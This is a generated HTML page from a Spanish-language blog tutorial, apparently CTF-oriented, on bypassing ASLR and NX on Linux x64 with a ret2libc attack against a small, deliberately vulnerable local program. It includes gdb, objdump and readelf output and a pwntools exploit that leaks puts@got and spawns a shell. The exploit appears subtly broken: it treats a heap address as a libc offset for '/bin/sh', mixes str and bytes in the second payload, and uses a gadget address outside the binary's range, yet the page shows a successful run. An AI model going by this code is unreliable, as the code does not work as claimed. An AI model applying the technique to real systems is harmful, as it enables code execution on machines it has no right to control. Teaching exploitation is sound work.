@@ -1,0 +1,627 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="es" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Bypass ASLR/NX - c4rta</title>
+<meta name="description" content="En este articulo veremos como hacer bypass del ASLR y NX en Linux x64">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="es_ES">
+<meta property="og:site_name" content="c4rta">
+<meta property="og:title" content="Bypass ASLR/NX">
+<meta property="og:url" content="http://localhost:4000/bypass-aslr-nx/">
+
+
+  <meta property="og:description" content="En este articulo veremos como hacer bypass del ASLR y NX en Linux x64">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2022-08-11T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/bypass-aslr-nx/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "c4rta",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="c4rta Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categorias/" >Categorias</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Bypass ASLR/NX</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="c4rta" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">c4rta</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        CTF player<br>Enstusiasta a la ciberseguridad
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/ic4rta" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Bypass ASLR/NX">
+    <meta itemprop="description" content="En este articulo veremos como hacer bypass del ASLR y NX en Linux x64">
+    <meta itemprop="datePublished" content="August 11, 2022">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Bypass ASLR/NX
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-08-11T00:00:00-05:00">August 11, 2022 </time>&emsp;
+          
+          
+        </p>
+        <font size="1">Hay muchas mas formas de hacer bypass del ASLR, asi que no se queden solo con esta</font>
+
+<h2 id="contenido">Contenido</h2>
+<ul>
+  <li>ASRL</li>
+  <li>Analizando el binario</li>
+  <li>Calculando el offset el RIP</li>
+  <li>Sacando las direcciones de puts y puts@got</li>
+  <li>Sacando la direccion de pop rdi; ret</li>
+  <li>Sacando los offsets de puts, system y sh usando libc</li>
+  <li>Ejecutando el exploit</li>
+</ul>
+
+<h2 id="aslr">ASLR</h2>
+
+<p>La aleatorización de la disposición del espacio de direcciones (ASLR) es una funcion a nivel de kernel la cual permite que las direcciones del stack, librerias, etc, sean diferentes, esto hace que para explotar una vulnerabilidad en un binario se mas dificil</p>
+
+<h2 id="analizando-el-binario">Analizando el binario</h2>
+
+<p>El codigo del binario es el siguiente:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+</span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
+        <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Input: "</span><span class="p">);</span>
+        <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Como se puede ver el binario usa la funcion <code class="language-plaintext highlighter-rouge">gets</code> la cual no es segura de usar ya que no se controla la cantidad de datos a pasar, es decir que si tenemos un buffer de 100 y le pasamos 120, esos 20 de sobra los seguira almacenando.</p>
+
+<h2 id="calculando-el-offset-el-rip">Calculando el offset el RIP</h2>
+
+<p>Ya se la saben banda, simplemente tenemos que meter el binario de un debugger, en mi caso usare gdb con <a href="https://github.com/hugsy/gef">gef</a>.</p>
+
+<p>Ahora una vez dentro con el comando <code class="language-plaintext highlighter-rouge">pattern create 150</code> generaremos 150 carcteres que nos ayudara para sacar el offset del rip, esos caracteres se los pasaremos como input al programa, vemos que el programa peto y se ocasiono el buffer overflow</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Program received signal SIGSEGV, Segmentation fault.
+0x0000000000401187 in main ()
+</code></pre></div></div>
+<p>Ahora mostraremos el stack frame con <code class="language-plaintext highlighter-rouge">i f</code> y vemos que nuestro <code class="language-plaintext highlighter-rouge">saved rip</code> vale <code class="language-plaintext highlighter-rouge">0x6161616161616170</code>, esto son algunos de los caracteres que le pasamos de la cadena que se genero pero en hex. Ahora con el comando <code class="language-plaintext highlighter-rouge">patter offset</code> le pasaremos esa valor para saber el offset:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  patter offset 0x6161616161616170
+[+] Searching for '0x6161616161616170'
+[+] Found at offset 120 (little-endian search) likely
+[+] Found at offset 113 (big-endian search) 
+</code></pre></div></div>
+
+<p>Vemos como el offset del RIP es <code class="language-plaintext highlighter-rouge">120</code></p>
+
+<h2 id="sacando-las-direcciones-de-puts-y-putsgot">Sacando las direcciones de puts y puts@got</h2>
+
+<p>Ahora viene la parte mas compleja, para esa practica tenemos que hacer 3 cosas</p>
+
+<ul>
+  <li>Sacar la direccion de puts@plt</li>
+  <li>La direccion de main</li>
+  <li>La direccion de puts@got</li>
+</ul>
+
+<h3 id="direccion-de-putsplt">Direccion de puts@plt</h3>
+
+<p>Esto lo hacemos ya que necesitamos llamar a puts y afortunadamente no se ve afectada por el ASLR, la primera manera de obtenerlos es poner el comando <code class="language-plaintext highlighter-rouge">p  puts@plt</code> en gdb, nos debe de mostrar algo como esto:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  p 'puts@plt'
+$1 = {&lt;text variable, no debug info&gt;} 0x401030 &lt;puts@plt&gt;
+</code></pre></div></div>
+<p>Ahi podemos ver que es <code class="language-plaintext highlighter-rouge">0x401030</code>.
+Para la segunda forma podemos usar el comando <code class="language-plaintext highlighter-rouge">objdump</code> de la siguiente manera</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>objdump -d -M intel vuln | grep "puts@plt"
+</code></pre></div></div>
+<p>Y nos debe de mostrar algo como esto:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0000000000401020 &lt;puts@plt-0x10&gt;:
+0000000000401030 &lt;puts@plt&gt;:
+  40115f:	e8 cc fe ff ff       	call   401030 &lt;puts@plt&gt;
+</code></pre></div></div>
+<p>Vemos que es exactamente la misma direccion.</p>
+
+<h3 id="la-direccion-de-main">La direccion de main</h3>
+
+<p>Esto es util ya que si el programa se detiene, ahora sabra que la direccion base del ASLR sera random otra vez.
+Para esto en el gdb usaremos el comando <code class="language-plaintext highlighter-rouge">p main</code> y nos muesta esto:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  p main
+$2 = {&lt;text variable, no debug info&gt;} 0x401146 &lt;main&gt;
+</code></pre></div></div>
+<p>Ahora sabemos que la direccion de main es <code class="language-plaintext highlighter-rouge">0x401146</code></p>
+
+<h3 id="direccion-de-putsgot">Direccion de puts@got</h3>
+
+<p>La primera forma de conseguirlo es usando el comando <code class="language-plaintext highlighter-rouge">objdump</code> pero ahora de esta forma <code class="language-plaintext highlighter-rouge">objdump -R vuln</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>objdump -R vuln                                                                    06:12:23 
+
+vuln:     formato del fichero elf64-x86-64
+
+DYNAMIC RELOCATION RECORDS
+OFFSET           TYPE              VALUE 
+0000000000403fe0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.34
+0000000000403fe8 R_X86_64_GLOB_DAT  _ITM_deregisterTMCloneTable@Base
+0000000000403ff0 R_X86_64_GLOB_DAT  __gmon_start__@Base
+0000000000403ff8 R_X86_64_GLOB_DAT  _ITM_registerTMCloneTable@Base
+0000000000404018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5 &lt;--
+0000000000404020 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5
+0000000000404028 R_X86_64_JUMP_SLOT  gets@GLIBC_2.2.5
+</code></pre></div></div>
+<p>Podemos ver que obtuvumos la direccion de <code class="language-plaintext highlighter-rouge">puts@GLIBC</code>, esto es lo mismo que GOT solo que se obtiene el nombre de <code class="language-plaintext highlighter-rouge">glibc</code> ya que es la direccion externa de puts.</p>
+
+<p>Para la segunda forma usaremos gdb, y la direccion que nos salio de puts@plt mostraremos su contenido con el comando <code class="language-plaintext highlighter-rouge">disassemble 0x401030</code>, esto nos debe de mostrar esto:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  disassemble 0x401030
+Dump of assembler code for function puts@plt:
+   0x0000000000401030 &lt;+0&gt;:	jmp    QWORD PTR [rip+0x2fe2]        # 0x404018 &lt;puts@got.plt&gt;
+</code></pre></div></div>
+<p>Aun que sean diferentes podemos usar cualquiera de las dos.</p>
+
+<h2 id="sacando-la-direccion-de-pop-rdi-ret">Sacando la direccion de pop rdi; ret</h2>
+
+<p>Para esta parte usaremos un gadget que nos servira para meter cualquier cosa a <code class="language-plaintext highlighter-rouge">rdi</code> (si aun no vez el post de ret2libc bypass NX te recomiendo verlo, ahi explico mas a detalle esto de ROP y los gadgets).</p>
+
+<p>De igual manera podemos hacerlo de dos formas, la primera y mas sencilla es usar ROPgadget con el comando <code class="language-plaintext highlighter-rouge">ROPgadget --binary vuln</code> y buscar donde diga <code class="language-plaintext highlighter-rouge">pop rdi ; ret</code> (yo lo hare con ROPgadget), y la otra es calcularla a travez de la direccion de puts, esto lo haremos con el comando <code class="language-plaintext highlighter-rouge">readelf</code> de esta forma:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>readelf -s /usr/lib/libc.so.6 | grep puts@@
+</code></pre></div></div>
+<p>Nos muestra la direccion</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>readelf -s /usr/lib/libc.so.6 | grep puts@@                                        06:39:55 
+   808: 0000000000079280   294 FUNC    WEAK   DEFAULT   14 fputs@@GLIBC_2.2.5
+  1429: 000000000007a6f0   409 FUNC    WEAK   DEFAULT   14 puts@@GLIBC_2.2.5
+  1438: 000000000007a6f0   409 FUNC    GLOBAL DEFAULT   14 _IO_puts@@GLIBC_2.2.5
+</code></pre></div></div>
+<p>Y podriamos usar esta <code class="language-plaintext highlighter-rouge">000000000007a6f0</code></p>
+
+<p>Lo que deben de modificar es la ruta de libc, la pueden sacar con el comando ldd</p>
+
+<h2 id="sacando-los-offsets-de-puts-system-y-binsh-usando-libc">Sacando los offsets de puts, system y /bin/sh usando libc</h2>
+
+<p>De igual manera usaremos el comando <code class="language-plaintext highlighter-rouge">objdump</code> pero ahora de esta forma</p>
+
+<p>System</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>objdump -d -M intel /usr/lib/libc.so.6 | grep "system" 
+</code></pre></div></div>
+<p>puts</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>objdump -d -M intel /usr/lib/libc.so.6 | grep "_IO_puts" 
+</code></pre></div></div>
+<p>Y ambos comandos nos deben de mostrar algo como esto:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>000000000004ba40 &lt;__libc_system@@GLIBC_PRIVATE&gt;:
+000000000007a6f0 &lt;_IO_puts@@GLIBC_2.2.5&gt;:
+</code></pre></div></div>
+
+<p>/bin/sh</p>
+
+<p>Para esto usare el comando grep que viene incorporado en gef el comando grep,</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  grep "/bin/sh"
+[+] Searching '/bin/sh' in memory
+[+] In '[heap]'(0x405000-0x426000), permission=rw-
+  0x405ac0 - 0x405ac7  →   "/bin/sh" 
+  0x405ae0 - 0x405ae7  →   "/bin/sh" 
+[+] In '/usr/lib/libc.so.6'(0x7ffff7da0000-0x7ffff7df8000), permission=r--
+  0x7ffff7dbb26a - 0x7ffff7dbb271  →   "/bin/sh" 
+</code></pre></div></div>
+
+<h2 id="ejecutando-el-exploit">Ejecutando el exploit</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./vuln'</span><span class="p">)</span>
+
+<span class="n">main</span> <span class="o">=</span> <span class="mh">0x0401146</span>
+<span class="n">puts_got</span> <span class="o">=</span> <span class="mh">0x0000000000404018</span>
+<span class="n">puts_plt</span> <span class="o">=</span> <span class="mh">0x0000000000401030</span>
+<span class="n">gadget</span> <span class="o">=</span> <span class="mh">0x00000000004005f3</span>
+
+<span class="n">puts_libc</span> <span class="o">=</span> <span class="mh">0x000000000007a6f0</span>
+<span class="n">system_libc</span> <span class="o">=</span> <span class="mh">0x000000000004ba40</span>
+<span class="n">bin_sh</span> <span class="o">=</span> <span class="mh">0x405ac0</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mi">120</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">gadget</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">output</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">output</span> <span class="o">=</span> <span class="n">output</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">output</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00\x00</span><span class="s">'</span>
+<span class="n">puts_libc_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
+<span class="n">system_libc_addr</span> <span class="o">=</span> <span class="n">puts_libc_addr</span> <span class="o">-</span> <span class="n">puts_libc</span> <span class="o">+</span> <span class="n">system_libc</span>
+<span class="n">sh_libc_addr</span> <span class="o">=</span> <span class="n">puts_libc_addr</span> <span class="o">-</span> <span class="n">puts_libc</span> <span class="o">+</span> <span class="n">bin_sh</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">120</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">gadget</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">sh_libc_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_libc_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+<p>Y nos debe de mostrar algo como esto:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 exploit.py                                                      6s  01:07:40 
+[+] Starting local process './vuln': pid 9984
+[*] Switching to interactive mode
+$ whoami
+omarh
+</code></pre></div></div>
+
+<p>Eso ha sido todo, gracias por leer ❤</p>
+
+<p><img src="/assets/images/bypass-aslr/waifu.gif" alt="" /></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#bof" class="page__taxonomy-item" rel="tag">bof</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#gdb" class="page__taxonomy-item" rel="tag">gdb</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#ret2libc" class="page__taxonomy-item" rel="tag">ret2libc</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categorias/#explotacion-binaria" class="page__taxonomy-item" rel="tag">Explotacion binaria</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2022-08-11T00:00:00-05:00">August 11, 2022</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/leak-stack-canary/" class="pagination--pager" title="Leak stack canary - bypass
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 c4rta</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
